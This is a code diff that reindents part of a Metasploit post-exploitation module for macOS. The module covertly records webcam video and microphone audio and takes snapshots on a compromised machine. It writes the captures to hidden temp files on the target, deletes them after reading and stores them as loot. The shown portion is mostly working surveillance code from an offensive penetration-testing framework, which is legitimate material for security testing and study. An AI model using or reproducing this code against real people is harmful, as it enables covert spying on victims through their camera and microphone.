@@ -9,9 +9,9 @@ require 'msf/core'
 require 'shellwords'
 
 class Metasploit3 < Msf::Post
-	include Msf::Post::File
-	include Msf::Auxiliary::Report
-	include Msf::Post::OSX::RubyDL
+  include Msf::Post::File
+  include Msf::Auxiliary::Report
+  include Msf::Post::OSX::RubyDL
 
   POLL_TIMEOUT = 120
 
@@ -35,28 +35,28 @@ class Metasploit3 < Msf::Post
       'DefaultAction' => 'LIST'
     ))
 
-		register_options(
-			[
-				OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
-				OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
-				OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
-				OptString.new('TMP_FILE',
-					[true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
-				),
-				OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
-				OptString.new('AUDIO_COMPRESSION',
-					[true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']
-				),
-				OptString.new('VIDEO_COMPRESSION',
-					[true, 'Compression type to use for video', 'QTCompressionOptionsSD480SizeH264Video']
-				),
-				OptEnum.new('SNAP_FILETYPE',
-					[true, 'File format to use when saving a snapshot', 'png', %w(jpg png gif tiff bmp)]
-				),
-				OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
-				OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
-			], self.class)
-	end
+    register_options(
+      [
+        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
+        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
+        OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
+        OptString.new('TMP_FILE',
+          [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
+        ),
+        OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
+        OptString.new('AUDIO_COMPRESSION',
+          [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']
+        ),
+        OptString.new('VIDEO_COMPRESSION',
+          [true, 'Compression type to use for video', 'QTCompressionOptionsSD480SizeH264Video']
+        ),
+        OptEnum.new('SNAP_FILETYPE',
+          [true, 'File format to use when saving a snapshot', 'png', %w(jpg png gif tiff bmp)]
+        ),
+        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
+        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
+      ], self.class)
+  end
 
   def run
     fail_with("Invalid session ID selected.") if client.nil?
@@ -80,51 +80,51 @@ class Metasploit3 < Msf::Post
       :snap_file => tmp_file+datastore['SNAP_FILETYPE']
     )
 
-		output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
-		if action.name =~ /list/i
-			print_good output
-		elsif action.name =~ /record/i
-			@pid = output.to_i
-			print_status "Running record service with PID #{@pid}"
-			(0...num_chunks).each do |i|
-				# wait SYNC_WAIT seconds
-				print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
-				Rex.sleep(datastore['SYNC_WAIT'])
-				# start reading for file
-				begin
-					::Timeout.timeout(poll_timeout) do
-						while true
-							if File.exist?(tmp_file)
-								# read file
-								contents = File.read(tmp_file)
-								# delete file
-								rm_f(tmp_file)
-								# roll filename
-								base = File.basename(tmp_file, '.*') # returns it with no extension
-								num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
-								ext = File.extname(tmp_file) || 'o'
-								tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
-								# store contents in file
-								title = "OSX Webcam Recording "+i.to_s
-								f = store_loot(title, "video/mov", session, contents,
-									"osx_webcam_rec#{i}.mov", title)
-								print_good "Record file captured and saved to #{f}"
-								print_status "Rolling movie file. "
-								break
-							else
-								Rex.sleep(0.3)
-							end
-						end
-					end
-				rescue ::Timeout::Error
-					fail_with("Client did not respond to new file request, exiting.")
-				end
-			end
-		elsif action.name =~ /snap/i
-			if output.include?('(RuntimeError)')
-				print_error output
-				return
-			end
+    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
+    if action.name =~ /list/i
+      print_good output
+    elsif action.name =~ /record/i
+      @pid = output.to_i
+      print_status "Running record service with PID #{@pid}"
+      (0...num_chunks).each do |i|
+        # wait SYNC_WAIT seconds
+        print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
+        Rex.sleep(datastore['SYNC_WAIT'])
+        # start reading for file
+        begin
+          ::Timeout.timeout(poll_timeout) do
+            while true
+              if File.exist?(tmp_file)
+                # read file
+                contents = File.read(tmp_file)
+                # delete file
+                rm_f(tmp_file)
+                # roll filename
+                base = File.basename(tmp_file, '.*') # returns it with no extension
+                num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
+                ext = File.extname(tmp_file) || 'o'
+                tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
+                # store contents in file
+                title = "OSX Webcam Recording "+i.to_s
+                f = store_loot(title, "video/mov", session, contents,
+                  "osx_webcam_rec#{i}.mov", title)
+                print_good "Record file captured and saved to #{f}"
+                print_status "Rolling movie file. "
+                break
+              else
+                Rex.sleep(0.3)
+              end
+            end
+          end
+        rescue ::Timeout::Error
+          fail_with("Client did not respond to new file request, exiting.")
+        end
+      end
+    elsif action.name =~ /snap/i
+      if output.include?('(RuntimeError)')
+        print_error output
+        return
+      end
 
       snap_type = datastore['SNAP_FILETYPE']
       img = read_file(tmp_file+snap_type)
